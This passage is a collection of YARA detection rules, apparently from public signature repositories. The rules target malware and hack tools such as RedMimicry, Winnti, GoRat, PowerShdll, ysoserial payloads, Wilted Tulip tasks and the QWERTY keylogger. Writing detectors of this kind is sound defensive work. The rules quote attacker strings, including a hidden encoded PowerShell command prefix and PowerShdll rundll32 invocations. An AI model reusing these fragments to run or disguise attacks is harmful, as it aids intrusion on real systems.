		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/implant_win_quantum_builder_lnk.yar#L1-L44"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "dd090af0e062b633173ac8483d8659e1fd8aa7898c641714fbe4b30bdd276b3d"
		score = 75
		quality = 30
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$magic_lnk = { 4C 00 00 00 01 14 02 00 }
		$powershell_ascii = "\\WindowsPowerShell\\v1.0\\powershell.exe"
		$powershell_wide = "powershell.exe" wide
		$start = "<#" wide
		$end = "#>" wide
		$foreach = "=$Null;foreach(" wide
		$return = "};return" wide

rule SIGNATURE_BASE_HKTL_Redmimicry_Agent
{
	meta:
		description = "matches the RedMimicry agent executable and payload"
		author = "mirar@chaosmail.org"
		id = "a4d4ec77-4a0d-5afd-9181-85433e8b5fda"
		date = "2020-06-22"
		modified = "2023-01-06"
		reference = "https://redmimicry.com"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_redmimicry.yar#L2-L26"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "645da2764ca911c4aae80b90622d2c61933dee929403858fc49f7bc0d44300c6"
		score = 75
		quality = 85
		tags = ""
		sharing = "tlp:white"

	strings:
		$reg0 = "HKEY_CURRENT_USER\\" ascii
		$reg1 = "HKEY_LOCAL_MACHINE\\" ascii
		$reg2 = "HKEY_CURRENT_CONFIG\\" ascii
		$reg3 = "HKEY_CLASSES_ROOT\\" ascii
		$cmd0 = "C:\\Windows\\System32\\cmd.exe" ascii fullword
		$lua0 = "client_recv" ascii fullword
		$lua1 = "client_send" ascii fullword
		$lua2 = "$LuaVersion: " ascii
		$sym0 = "VirtualAllocEx" wide fullword
		$sym1 = "kernel32.dll" wide fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_HKTL_Redmimicry_Winntiloader
{
	meta:
		description = "matches the Winnti 'Cooper' loader version used for the RedMimicry breach emulation"
		author = "mirar@chaosmail.org"
		id = "a8be1377-faa0-560d-a12c-0369b1f91180"
		date = "2020-06-22"
		modified = "2023-01-10"
		reference = "https://redmimicry.com"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_redmimicry.yar#L28-L59"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "d8ef457ac41a7c45cc7e97330bdd3de12eb3391c03d0a6a87ddc669c841c325d"
		score = 75
		quality = 85
		tags = ""
		sharing = "tlp:white"

	strings:
		$s0 = "Cooper" ascii fullword
		$s1 = "stone64.dll" ascii fullword
		$decoding_loop = { 49 63 D0 43 8D 0C 01 41 FF C0 42 32 0C 1A 0F B6 C1 C0 E9 04 C0 E0 04 02 C1 42 88 04 1A 44 3B 03 72 DE }

	condition:
		all of them
}

rule SIGNATURE_BASE_Greenbug_Malware_3
{
	meta:
		description = "Detects Backdoor from Greenbug Incident"
		author = "Florian Roth (Nextron Systems)"
		id = "68142bcd-4bd0-5c80-97fc-38811565e21c"
		date = "2017-01-25"
		modified = "2023-12-05"
		reference = "https://goo.gl/urp4CD"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_greenbug.yar#L56-L73"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "f4e8672da2ed9d90d4ebfccca977c4aeb93656d9e467cf479699cefd03611f32"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash1 = "44bdf5266b45185b6824898664fd0c0f2039cdcb48b390f150e71345cd867c49"
		hash2 = "7f16824e7ad9ee1ad2debca2a22413cde08f02ee9f0d08d64eb4cb318538be9c"

	strings:
		$x1 = "F:\\Projects\\Bot\\Bot\\Release\\Ism.pdb" fullword ascii
		$x2 = "C:\\ddd\\wer2.txt" fullword wide
		$x3 = "\\Microsoft\\Windows\\tmp43hh11.txt" wide

	condition:
		1 of them
}

rule SIGNATURE_BASE_APT_Backdoor_Win_Gorat_Memory_1
{
	meta:
		description = "Identifies GoRat malware in memory based on strings."
		author = "FireEye"
		id = "4fcdd98f-1873-58e1-a9f5-73ee0aa5a69f"
		date = "2025-02-12"
		modified = "2025-02-12"
		reference = "https://www.fireeye.com/blog/products-and-services/2020/12/fireeye-shares-details-of-recent-cyber-attack-actions-to-protect-community.html"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_fireeye_redteam_tools.yar#L1013-L1039"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "3b926b5762e13ceec7ac3a61e85c93bb"
		logic_hash = "bf8d80b7a7d35c1bcb353ff66d10bc95c2e6502043acc6554887465a467cdcf7"
		score = 75
		quality = 85
		tags = ""

	strings:
		$rat1 = "rat/modules/socks.(*HTTPProxyClient).beacon" fullword
		$rat2 = "rat.(*Core).generateBeacon" fullword
		$rat3 = "rat.gJitter" fullword
		$rat4 = "rat/comms.(*protectedChannel).SendCmdResponse" fullword
		$rat5 = "rat/modules/filemgmt.(*acquire).NewCommandExecution" fullword
		$rat6 = "rat/modules/latlisten.(*latlistensrv).handleCmd" fullword
		$rat7 = "rat/modules/netsweeper.(*netsweeperRunner).runSweep" fullword
		$rat8 = "rat/modules/netsweeper.(*Pinger).listen" fullword
		$rat9 = "rat/modules/socks.(*HTTPProxyClient).beacon" fullword
		$rat10 = "rat/platforms/win/dyloader.(*memoryLoader).ExecutePluginFunction" fullword
		$rat11 = "rat/platforms/win/modules/namedpipe.(*dummy).Open" fullword
		$winblows = "rat/platforms/win.(*winblows).GetStage" fullword

	condition:
		$winblows or 3 of ( $rat* )
}

rule SIGNATURE_BASE_APT_Builder_PY_REDFLARE_2_1
{
	meta:
		description = "No description has been set in the source file - Signature Base"
		author = "FireEye"
		id = "74c56ee1-734e-5fdb-beee-6345a5993f68"
		date = "2020-12-01"
		modified = "2020-12-01"
		reference = "https://www.fireeye.com/blog/products-and-services/2020/12/fireeye-shares-details-of-recent-cyber-attack-actions-to-protect-community.html"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_fireeye_redteam_tools.yar#L1376-L1391"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "4410e95de247d7f1ab649aa640ee86fb"
		logic_hash = "0f28fb23c0c1d589466c7c541c8dc588b038d02dded0c66c4a448d1f768c95c5"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "<510sxxII"
		$s2 = "0x43,0x00,0x3a,0x00,0x5c,0x00,0x57,0x00,0x69,0x00,0x6e,0x00,0x64,0x00,0x6f,0x00,"
		$s3 = "parsePluginOutput"

	condition:
		all of them and #s2 == 2
}

rule SIGNATURE_BASE_Powershdll
{
	meta:
		description = "Detects hack tool PowerShdll"
		author = "Florian Roth (Nextron Systems)"
		id = "cc0e01ca-77f0-5665-8b1e-48c8e947d0d3"
		date = "2017-08-03"
		modified = "2023-12-05"
		reference = "https://github.com/p3nt4/PowerShdll"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_powershdll.yar#L9-L25"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "6c93eca642cc29e6ce661e6ea975bc1a88fff4e6a4825c1da3f82b3a6701392a"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "4d33bc7cfa79d7eefc5f7a99f1b052afdb84895a411d7c30045498fd4303898a"
		hash2 = "f999db9cc3a0719c19f35f0e760f4ce3377b31b756d8cd91bb8270acecd7be7d"

	strings:
		$x1 = "rundll32 PowerShdll,main -f <path>" fullword wide
		$x2 = "\\PowerShdll.dll" ascii
		$x3 = "rundll32 PowerShdll,main <script>" fullword wide

	condition:
		1 of them
}

rule SIGNATURE_BASE_Ysoserial_Payload_Spring1
{
	meta:
		description = "Ysoserial Payloads - file Spring1.bin"
		author = "Florian Roth (Nextron Systems)"
		id = "c269e032-b6ce-5faa-b3ce-a5304f3e9dab"
		date = "2017-02-04"
		modified = "2023-12-05"
		reference = "https://github.com/frohoff/ysoserial"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_ysoserial_payloads.yar#L40-L59"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "852390d242c5cac243b54c31234c0ef3e25cede376eea23c73f03d79c548be8a"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "bf9b5f35bc1556d277853b71da24faf23cf9964d77245018a0fdf3359f3b1703"
		hash2 = "9c0be107d93096066e82a5404eb6829b1daa6aaa1a7b43bcda3ddac567ce715a"
		hash3 = "8cfa85c16d37fb2c38f277f39cafb6f0c0bd7ee62b14d53ad1dd9cb3f4b25dd8"
		hash4 = "5c44482350f1c6d68749c8dec167660ca6427999c37bfebaa54f677345cdf63c"
		hash5 = "95f966f2e8c5d0bcdfb34e603e3c0b911fa31fc960308e41fcd4459e4e07b4d1"
		hash6 = "1da04d838141c64711d87695a4cdb4eedfd4a206cc80922a41cfc82df8e24187"
		hash7 = "adf895fa95526c9ce48ec33297156dd69c3dbcdd2432000e61b2dd34ffc167c7"

	strings:
		$x1 = "ysoserial/Pwner" ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_Wiltedtulip_Windows_UM_Task
{
	meta:
		description = "Detects a Windows scheduled task as used in Operation Wilted Tulip"
		author = "Florian Roth (Nextron Systems)"
		id = "d827584e-8298-56e4-8466-90950d1f286e"
		date = "2017-07-23"
		modified = "2023-12-05"
		reference = "http://www.clearskysec.com/tulip"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_wilted_tulip.yar#L90-L107"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "cfc2d231b6be798172e5d7ffc525842c7eed6d78a145c401136452c46f21e3b2"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "4c2fc21a4aab7686877ddd35d74a917f6156e48117920d45a3d2f21fb74fedd3"

	strings:
		$r1 = "<Command>C:\\Windows\\syswow64\\rundll32.exe</Command>" fullword wide
		$p1 = "<Arguments>\"C:\\Users\\public\\" wide
		$c1 = "svchost64.swp\",checkUpdate" wide ascii
		$c2 = "svchost64.swp,checkUpdate" wide ascii

	condition:
		($r1 and $p1 ) or 1 of ( $c* )
}

rule SIGNATURE_BASE_Wiltedtulip_Windowstask
{
	meta:
		description = "Detects hack tool used in Operation Wilted Tulip - Windows Tasks"
		author = "Florian Roth (Nextron Systems)"
		id = "ad8193f0-e664-50a8-ab05-38027a2e33cd"
		date = "2017-07-23"
		modified = "2023-12-05"
		reference = "http://www.clearskysec.com/tulip"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_wilted_tulip.yar#L109-L128"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "a2bbcb02f34b2da3d88772d211cc7bfb669384161eec94336cdc2474144b16ae"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "c3cbe88b82cd0ea46868fb4f2e8ed226f3419fc6d4d6b5f7561e70f4cd33822c"
		hash2 = "340cbbffbb7685133fc318fa20e4620ddf15e56c0e65d4cf1b2d606790d4425d"
		hash3 = "b6f515b3f713b70b808fc6578232901ffdeadeb419c9c4219fbfba417bba9f01"
		hash4 = "5046e7c28f5f2781ed7a63b0871f4a2b3065b70d62de7254491339e8fe2fa14a"
		hash5 = "984c7e1f76c21daf214b3f7e131ceb60c14abf1b0f4066eae563e9c184372a34"

	strings:
		$x1 = "<Command>C:\\Windows\\svchost.exe</Command>" fullword wide
		$x2 = "<Arguments>-nop -w hidden -encodedcommand" wide
		$x3 = "-encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgA"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Fiveeyes_QUERTY_Malwareqwerty_20121
{
	meta:
		description = "FiveEyes QUERTY Malware - file 20121.xml"
		author = "Florian Roth (Nextron Systems)"
		id = "bf30bdbb-0153-5ae2-bf42-4bd9e4a2f088"
		date = "2015-01-18"
		modified = "2023-12-05"
		reference = "http://www.spiegel.de/media/media-35668.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/spy_querty_fiveeyes.yar#L3-L26"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "8263fb58350f3b1d3c4220a602421232d5e40726"
		logic_hash = "e2660abf4959bc57bcf9d95d974cd20718d5d27f371109cb4526cee208544530"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<configFileName>20121_cmdDef.xml</configFileName>" fullword ascii
		$s1 = "<name>20121.dll</name>" fullword ascii
		$s2 = "<codebase>\"Reserved for future use.\"</codebase>" fullword ascii
		$s3 = "<plugin xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:noNamespaceS" ascii
		$s4 = "<platform type=\"1\">" fullword ascii
		$s5 = "</plugin>" fullword ascii
		$s6 = "</pluginConfig>" fullword ascii
		$s7 = "<pluginConfig>" fullword ascii
		$s8 = "</platform>" fullword ascii
		$s9 = "</lpConfig>" fullword ascii
		$s10 = "<lpConfig>" fullword ascii

	condition:
		9 of them
}

rule SIGNATURE_BASE_Fiveeyes_QUERTY_Malwaresig_20123_Sys
{
	meta:
		description = "FiveEyes QUERTY Malware - file 20123.sys.bin"
		author = "Florian Roth (Nextron Systems)"
		id = "0d0e3642-f5d4-59b2-8e56-a7c999e34775"
		date = "2015-01-18"
		modified = "2023-12-05"
		reference = "http://www.spiegel.de/media/media-35668.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/spy_querty_fiveeyes.yar#L28-L45"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "a0f0087bd1f8234d5e847363d7e15be8a3e6f099"
		logic_hash = "881af0e2ff8fad2bca2ae05ad63b5185356181685daafa7a1b9992a1de017c9e"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "20123.dll" fullword ascii
		$s1 = "kbdclass.sys" fullword wide
		$s2 = "IoFreeMdl" fullword ascii
		$s3 = "ntoskrnl.exe" fullword ascii
		$s4 = "KfReleaseSpinLock" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Fiveeyes_QUERTY_Malwaresig_20123_Cmddef
{
	meta:
		description = "FiveEyes QUERTY Malware - file 20123_cmdDef.xml"
		author = "Florian Roth (Nextron Systems)"
		id = "88a29288-9db5-5437-9efe-cdb823a2b928"
		date = "2015-01-18"
		modified = "2023-12-05"
		reference = "http://www.spiegel.de/media/media-35668.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/spy_querty_fiveeyes.yar#L47-L80"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "7b08fc77629f6caaf8cc4bb5f91be6b53e19a3cd"
		logic_hash = "84776764caa79ad68f2dd0d2f890821c75f2efba7c46d674110ba870a40a372a"
		score = 75
		quality = 83
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<shortDescription>Keystroke Collector</shortDescription>" fullword ascii
		$s1 = "This plugin is the E_Qwerty Kernel Mode driver for logging keys.</description>" fullword ascii
		$s2 = "<commands/>" fullword ascii
		$s3 = "</version>" fullword ascii
		$s4 = "<associatedImplantId>20121</associatedImplantId>" fullword ascii
		$s5 = "<rightsRequired>System or Administrator (if Administrator, I think the DriverIns" ascii
		$s6 = "<platforms>Windows NT, Windows 2000, Windows XP (32/64 bit), Windows 2003 (32/64" ascii
		$s7 = "<projectpath>plugin/Collection</projectpath>" fullword ascii
		$s8 = "<dllDepend>None</dllDepend>" fullword ascii
		$s9 = "<minorType>0</minorType>" fullword ascii
		$s10 = "<pluginname>E_QwertyKM</pluginname>" fullword ascii
		$s11 = "</comments>" fullword ascii
		$s12 = "<comments>" fullword ascii
		$s13 = "<majorType>1</majorType>" fullword ascii
		$s14 = "<files>None</files>" fullword ascii
		$s15 = "<poc>Erebus</poc>" fullword ascii
		$s16 = "</plugin>" fullword ascii
		$s17 = "<team>None</team>" fullword ascii
		$s18 = "<?xml-stylesheet type=\"text/xsl\" href=\"../XSLT/pluginHTML.xsl\"?>" fullword ascii
		$s19 = "<pluginsDepend>U_HookManager v1.0, Kernel Covert Store v1.0</pluginsDepend>" fullword ascii
		$s20 = "<plugin id=\"20123\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi" ascii

	condition:
		14 of them
}

rule SIGNATURE_BASE_Fiveeyes_QUERTY_Malwaresig_20121_Dll
{
	meta:
		description = "FiveEyes QUERTY Malware - file 20121.dll.bin"
		author = "Florian Roth (Nextron Systems)"
		id = "a0dc146c-85fd-55b8-a5e0-bfc1f406507e"
		date = "2015-01-18"
		modified = "2023-12-05"
		reference = "http://www.spiegel.de/media/media-35668.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/spy_querty_fiveeyes.yar#L82-L96"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "89504d91c5539a366e153894c1bc17277116342b"
		logic_hash = "e735a7c26652cbf2bccac80a14568a3582b254ae25e2db56a46c09a714650611"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "WarriorPride\\production2.0\\package\\E_Wzowski" ascii
		$s1 = "20121.dll" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Fiveeyes_QUERTY_Malwareqwerty_20123
{
	meta:
		description = "FiveEyes QUERTY Malware - file 20123.xml"
		author = "Florian Roth (Nextron Systems)"
		id = "718d80c9-b6bb-5b73-9c17-49e7d6f77210"
		date = "2015-01-18"
		modified = "2023-12-05"
		reference = "http://www.spiegel.de/media/media-35668.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/spy_querty_fiveeyes.yar#L97-L121"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "edc7228b2e27df9e7ff9286bddbf4e46adb51ed9"
		logic_hash = "918462399af78b16a8214ceb1d39db554e3136efd4bc643353f0727e4a162516"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<!-- edited with XMLSPY v5 rel. 4 U (http://www.xmlspy.com) by TEAM (RENEGADE) -" ascii
		$s1 = "<configFileName>20123_cmdDef.xml</configFileName>" fullword ascii
		$s2 = "<name>20123.sys</name>" fullword ascii
		$s3 = "<plugin xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:noNamespaceS" ascii
		$s4 = "<codebase>/bin/i686-pc-win32/debug</codebase>" fullword ascii
		$s5 = "<platform type=\"1\">" fullword ascii
		$s6 = "</plugin>" fullword ascii
		$s7 = "</pluginConfig>" fullword ascii
		$s8 = "<pluginConfig>" fullword ascii
		$s9 = "</platform>" fullword ascii
		$s10 = "</lpConfig>" fullword ascii
		$s11 = "<lpConfig>" fullword ascii

	condition:
		9 of them
}

rule SIGNATURE_BASE_Fiveeyes_QUERTY_Malwaresig_20120_Dll
{
	meta:
		description = "FiveEyes QUERTY Malware - file 20120.dll.bin"
		author = "Florian Roth (Nextron Systems)"
		id = "d23ac7bf-3e0c-5b59-a9dc-1ae0a4ae9c02"
		date = "2015-01-18"
		modified = "2023-12-05"
		reference = "http://www.spiegel.de/media/media-35668.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/spy_querty_fiveeyes.yar#L123-L156"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "6811bfa3b8cda5147440918f83c40237183dbd25"
		logic_hash = "fc3aac33c84d3b4a981c2d1a9358c54dc5ceca2017dbf2e2a51e1b6970b90796"
		score = 75
		quality = 83
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "\\QwLog_%d-%02d-%02d-%02d%02d%02d.txt" wide
		$s1 = "\\QwLog_%d-%02d-%02d-%02d%02d%02d.xml" wide
		$s2 = "Failed to send the EQwerty_driverStatusCommand to the implant." fullword ascii
		$s3 = "- Log Used (number of windows) - %d" fullword wide
		$s4 = "- Log Limit (number of windows) - %d" fullword wide
		$s5 = "Process or User Default Language" fullword wide
		$s6 = "Windows 98/Me, Windows NT 4.0 and later: Vietnamese" fullword wide
		$s7 = "- Logging of keystrokes is switched ON" fullword wide
		$s8 = "- Logging of keystrokes is switched OFF" fullword wide
		$s9 = "Qwerty is currently logging active windows with titles containing the fo" wide
		$s10 = "Windows 95, Windows NT 4.0 only: Korean (Johab)" fullword wide
		$s11 = "FAILED to get Qwerty Status" fullword wide
		$s12 = "- Successfully retrieved Log from Implant." fullword wide
		$s13 = "- Logging of all Windows is toggled ON" fullword wide
		$s14 = "- Logging of all Windows is toggled OFF" fullword wide
		$s15 = "Qwerty FAILED to retrieve window list." fullword wide
		$s16 = "- UNSUCCESSFUL Log Retrieval from Implant." fullword wide
		$s17 = "The implant failed to return a valid status" fullword ascii
		$s18 = "- Log files were NOT generated!" fullword wide
		$s19 = "Windows 2000/XP: Armenian. This is Unicode only." fullword wide
		$s20 = "- This machine is using a PS/2 Keyboard - Continue on using QWERTY" fullword wide

	condition:
		10 of them
}

rule SIGNATURE_BASE_Fiveeyes_QUERTY_Malwaresig_20120_Cmddef
{
	meta:
		description = "FiveEyes QUERTY Malware - file 20120_cmdDef.xml"
		author = "Florian Roth (Nextron Systems)"
		id = "dfa0693e-4e4c-59c8-9e51-e221aefd8662"
		date = "2015-01-18"
		modified = "2023-12-05"
		reference = "http://www.spiegel.de/media/media-35668.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/spy_querty_fiveeyes.yar#L158-L191"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "cda9ceaf0a39d6b8211ce96307302a53dfbd71ea"
		logic_hash = "9c336a09adb5fdf3149e5d0ad716cb854f95effa4ce4dfe3e75f43031e4903ff"
		score = 75
		quality = 83
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "This PPC gets the current keystroke log." fullword ascii
		$s1 = "This command will add the given WindowTitle to the list of Windows to log keys f" ascii
		$s2 = "This command will remove the WindowTitle corresponding to the given window title" ascii
		$s3 = "This command will return the current status of the Keyboard Logger (Whether it i" ascii
		$s4 = "This command Toggles logging of all Keys. If allkeys is toggled all keystrokes w" ascii
		$s5 = "<definition>Turn logging of all keys on|off</definition>" fullword ascii
		$s6 = "<name>Get Keystroke Log</name>" fullword ascii
		$s7 = "<description>Keystroke Logger Lp Plugin</description>" fullword ascii
		$s8 = "<definition>display help for this function</definition>" fullword ascii
		$s9 = "This command will switch ON Logging of keys. All keys taht are entered to a acti" ascii
		$s10 = "Set the log limit (in number of windows)" fullword ascii
		$s11 = "<example>qwgetlog</example>" fullword ascii
		$s12 = "<aliasName>qwgetlog</aliasName>" fullword ascii
		$s13 = "<definition>The title of the Window whose keys you wish to Log once it becomes a" ascii
		$s14 = "This command will switch OFF Logging of keys. No keystrokes will be captured" fullword ascii
		$s15 = "<definition>The title of the Window whose keys you no longer whish to log</defin" ascii
		$s16 = "<command id=\"32\">" fullword ascii
		$s17 = "<command id=\"3\">" fullword ascii
		$s18 = "<command id=\"7\">" fullword ascii
		$s19 = "<command id=\"1\">" fullword ascii
		$s20 = "<command id=\"4\">" fullword ascii

	condition:
		10 of them
}

rule SIGNATURE_BASE_Fiveeyes_QUERTY_Malwareqwerty_20120
{
	meta:
		description = "FiveEyes QUERTY Malware - file 20120.xml"
		author = "Florian Roth (Nextron Systems)"
		id = "503c71de-1bc5-5690-944c-a60917a4da09"
		date = "2015-01-18"
		modified = "2023-12-05"
		reference = "http://www.spiegel.de/media/media-35668.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/spy_querty_fiveeyes.yar#L193-L216"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "597082f05bfd3225587d480c30f54a7a1326a892"
		logic_hash = "7d2617e0ee41ea475608757594cba8ae93f2dbb09b5d01d1fa3324b32ebb8aa0"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<configFileName>20120_cmdDef.xml</configFileName>" fullword ascii
		$s1 = "<name>20120.dll</name>" fullword ascii
		$s2 = "<codebase>\"Reserved for future use.\"</codebase>" fullword ascii
		$s3 = "<plugin xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:noNamespaceS" ascii
		$s4 = "<platform type=\"1\">" fullword ascii
		$s5 = "</plugin>" fullword ascii
		$s6 = "</pluginConfig>" fullword ascii
		$s7 = "<pluginConfig>" fullword ascii
		$s8 = "</platform>" fullword ascii
		$s9 = "</lpConfig>" fullword ascii
		$s10 = "<lpConfig>" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Fiveeyes_QUERTY_Malwaresig_20121_Cmddef
{
	meta:
		description = "FiveEyes QUERTY Malware - file 20121_cmdDef.xml"
		author = "Florian Roth (Nextron Systems)"
		id = "2deb73f7-372e-5d29-a077-431ab1967d93"
		date = "2015-01-18"
		modified = "2023-12-05"
		reference = "http://www.spiegel.de/media/media-35668.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/spy_querty_fiveeyes.yar#L218-L251"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "64ac06aa4e8d93ea6063eade7ce9687b1d035907"
		logic_hash = "d73f0e964bd57ed3a2cd782ac204a2b82a9b334e33d64dc61e6414654d7c38d3"
		score = 75
		quality = 83
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<shortDescription>Keystroke Logger Plugin.</shortDescription>" fullword ascii
		$s1 = "<message>Failed to get File Time</message>" fullword ascii
		$s2 = "<description>Keystroke Logger Plugin.</description>" fullword ascii
		$s3 = "<message>Failed to set File Time</message>" fullword ascii
		$s4 = "</commands>" fullword ascii
		$s5 = "<commands>" fullword ascii
		$s6 = "</version>" fullword ascii
		$s7 = "<associatedImplantId>20120</associatedImplantId>" fullword ascii
		$s8 = "<message>No Comms. with Driver</message>" fullword ascii
		$s9 = "</error>" fullword ascii
		$s10 = "<message>Invalid File Size</message>" fullword ascii
		$s11 = "<platforms>Windows (User/Win32)</platforms>" fullword ascii
		$s12 = "<message>File Size Mismatch</message>" fullword ascii
		$s13 = "<projectpath>plugin/Utility</projectpath>" fullword ascii
		$s14 = "<pluginsDepend>None</pluginsDepend>" fullword ascii
		$s15 = "<dllDepend>None</dllDepend>" fullword ascii
		$s16 = "<pluginname>E_QwertyIM</pluginname>" fullword ascii
		$s17 = "<rightsRequired>None</rightsRequired>" fullword ascii
		$s18 = "<minorType>0</minorType>" fullword ascii
		$s19 = "<code>00001002</code>" fullword ascii
		$s20 = "<code>00001001</code>" fullword ascii

	condition:
		12 of them
}

